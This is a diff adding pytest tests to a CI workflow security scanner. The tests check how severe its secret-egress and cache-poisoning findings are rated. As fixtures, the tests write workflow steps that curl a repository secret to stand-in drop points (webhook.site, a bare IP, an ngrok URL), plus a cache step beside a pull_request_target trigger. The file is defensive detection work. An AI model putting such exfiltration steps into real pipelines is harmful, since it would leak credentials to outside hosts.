@@ -674,6 +674,35 @@ class TestPublishingIsNotExfiltration:
         assert not found, "publishing with your own credential is not malware"
         assert "SUSPECT.CI.SECRET_EGRESS.001" in EnterpriseNoiseHelpers.flagged(root)
 
+    @staticmethod
+    def egress_severities(root) -> list[Severity]:
+        return [
+            f.severity
+            for f in Scanner().scan(root).findings
+            if f.rule_id == "SUSPECT.CI.SECRET_EGRESS.001"
+        ]
+
+    def test_publishing_to_an_ordinary_host_is_recorded_not_raised(self, tmp_path) -> None:
+        root = self.workflow(
+            tmp_path,
+            "jobs:\n  release:\n    steps:\n"
+            '      - run: curl -H "Authorization: ${{ secrets.API_KEY }}" '
+            "https://api.example.com/releases\n",
+        )
+        assert self.egress_severities(root) == [Severity.LOW]
+
+    @pytest.mark.parametrize(
+        "destination",
+        ["https://webhook.site/0000", "http://203.0.113.7:8080/x", "https://x.ngrok.io/collect"],
+    )
+    def test_sending_to_a_drop_point_keeps_its_severity(self, tmp_path, destination) -> None:
+        root = self.workflow(
+            tmp_path,
+            "jobs:\n  release:\n    steps:\n"
+            f'      - run: curl -d "${{{{ secrets.API_KEY }}}}" {destination}\n',
+        )
+        assert self.egress_severities(root) == [Severity.MEDIUM]
+
     def test_the_whole_secret_context_still_is(self, tmp_path) -> None:
         """Serialising every secret the job can reach into one string is not
         how anything legitimate passes a credential."""
@@ -708,3 +737,30 @@ class TestPublishingIsNotExfiltration:
             "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n",
         )
         assert "SUSPECT.CI.SECRET_EGRESS.001" not in EnterpriseNoiseHelpers.flagged(root)
+
+
+class TestCachePoisoningNeedsAnUntrustedTrigger:
+    RELEASE = (
+        "on:\n  {trigger}\njobs:\n  release:\n    steps:\n"
+        "      - uses: actions/cache@v4\n        with:\n          path: ~/.npm\n          key: npm\n"
+        "      - run: npm publish\n"
+    )
+
+    @staticmethod
+    def severities(tmp_path, text: str):
+        target = tmp_path / ".github" / "workflows" / "release.yml"
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(text, encoding="utf-8")
+        return [
+            f.severity
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SUSPECT.CI.CACHE_POISONING.001"
+        ]
+
+    def test_a_tag_release_is_recorded(self, tmp_path) -> None:
+        found = self.severities(tmp_path, self.RELEASE.format(trigger="push:\n    tags: ['v*']"))
+        assert found == [Severity.LOW]
+
+    def test_beside_pull_request_target_it_is_raised(self, tmp_path) -> None:
+        found = self.severities(tmp_path, self.RELEASE.format(trigger="pull_request_target:"))
+        assert found == [Severity.MEDIUM]
